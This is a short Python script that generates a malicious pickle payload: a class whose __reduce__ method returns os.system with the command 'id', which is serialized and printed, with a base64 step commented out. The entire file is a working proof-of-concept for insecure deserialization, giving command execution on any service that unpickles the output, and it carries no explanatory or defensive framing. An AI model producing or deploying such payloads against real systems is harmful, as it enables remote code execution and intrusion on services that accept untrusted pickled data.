import sys
import os
import pickle
from typing import Any
import base64

class GNAT:
    def __reduce__(self):
        return(
            os.system,("id",)
        )


serielization=pickle.dumps(GNAT())
# encode=base64.b64encode(serielization)
# print(encode)
print(serielization)
